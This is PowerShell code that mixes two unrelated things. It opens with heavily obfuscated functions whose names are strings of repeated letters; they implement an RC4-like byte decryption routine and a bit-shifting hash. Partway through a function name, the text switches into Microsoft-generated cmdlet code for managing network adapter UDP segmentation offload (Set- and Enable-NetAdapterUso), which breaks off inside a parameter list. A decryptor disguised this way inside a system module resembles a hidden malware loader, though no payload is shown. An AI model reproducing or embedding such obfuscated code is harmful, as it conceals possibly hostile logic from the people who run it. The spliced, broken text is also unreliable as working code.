aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaa.GetHashCode() -band 0xFFF
}

function zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz($z
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzz, $aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa) {
$uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu = $zzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz = 0
$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa = [byte[]]::new($aaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa)

if ($aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -gt 0) {
$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa = 0
do {
  $uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu = (
$uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu + 1) % 256
  $zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz = ($zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz + 
$zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzz[$uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuu]) % 256
  $aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa = $zzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzz[$uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu]
  $zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzz[$uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuu] = $zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz[$zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz]
  $zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzz[$zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz] = 
$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
  $aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[$aaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa] = $zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz[($zzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz[$uu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu] + $zzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzz[$zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz]) % 256]
  $aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa++
} while ($aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -lt $aaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaa)
}

return ,$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
}

function aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaa {
param($zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzz)
$uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuu = $zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzz -bxor 0x12
$uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuu = ($uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuu -shl 1) -bor ($uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu -shr 4)
return $uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu -band 0x1FFF
}

function zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
hell.Cmdletization.MethodParameter]@{Name = 'IPv6Enabled'; ParameterType = 
'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = 
$true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6Enabled'; 
ParameterType = 'System.Boolean'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('NoRestart')) {
      [object]$__cmdletization_value = ${NoRestart}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = $null
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)
$__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and 
$PassThru
      if ($PSBoundParameters.ContainsKey('InputObject')) {
          foreach ($x in $InputObject) { 
$__cmdletization_objectModelWrapper.ProcessRecord($x, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
      } else {
          
$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
      }
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapterUso.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetAdapterUso' -Alias '*'
  

function Enable-NetAdapterUso
{
[CmdletBinding(DefaultParameterSetName='ByName', SupportsShouldProcess=$true, 
ConfirmImpact='Medium', PositionalBinding=$false)]

[OutputType([Microsoft.Management.Infrastructure.CimInstance])]
param(

[Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifAlias','InterfaceAlias')]
[ValidateNotNull()]
[string[]]
${Name},

[Parameter(ParameterSetName='ByInstanceID', Mandatory=$true, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifDesc','InstanceID')]
[ValidateNotNull()]
[string[]]
${InterfaceDescription},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[switch]
${IncludeHidden},

[Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, 
ValueFromPipeline=$true)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetAdapterUsoSettin
gData')]
[ValidateNotNull()]
[ciminstance[]]
${InputObject},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[switch]
${IPv4},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[switch]
${IPv6},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${NoRestart},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${PassThru},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[Alias('Session')]
